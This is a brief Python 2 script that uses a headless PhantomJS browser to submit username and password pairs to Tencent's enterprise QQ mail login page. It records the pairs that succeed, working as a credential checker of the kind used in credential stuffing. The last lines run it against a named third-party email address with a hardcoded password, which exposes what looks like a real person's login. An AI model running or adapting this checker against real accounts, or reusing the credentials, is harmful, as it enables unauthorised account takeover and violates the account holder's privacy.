#!/user/bin python
# -*- coding:utf-8 -*- 
# Author:Bing
# Contact:amazing_bing@outlook.com
# DateTime: 2016-12-21 17:52:08
# Description:  QQ邮箱测试

import sys
sys.path.append("../../")

from splinter import Browser

class Email(object):		
	def __init__(self):
		self.result = []

	def scanemail(self,username,password):
		browser = Browser("phantomjs")
		url = 'https://en.exmail.qq.com'
		try:
			browser.visit(url)
		except Exception as e:
			return
		#fill in username and password
		browser.find_by_id('inputuin').fill(username)
		browser.find_by_id('pp').fill(password)
		#click the button of login
		browser.find_by_id('btlogin').click()
		#time.sleep(1)
		redictUrl = 'https://en.exmail.qq.com/cgi-bin/frame_html'
		redictUrl2 = 'http://en.exmail.qq.com/cgi-bin/readtemplate'
		#print username,password
		print  browser.url
		if redictUrl2 in browser.url or redictUrl in browser.url:
			out = (username,password)
			browser.quit()
			self.result.append(out)
		else:
			print "[N]:%s : %s login failed" %(username,password)
			browser.quit()

t = Email()
t.scanemail("yaffa.yang@tiandaoedu.com","tiandao123")
print t.result


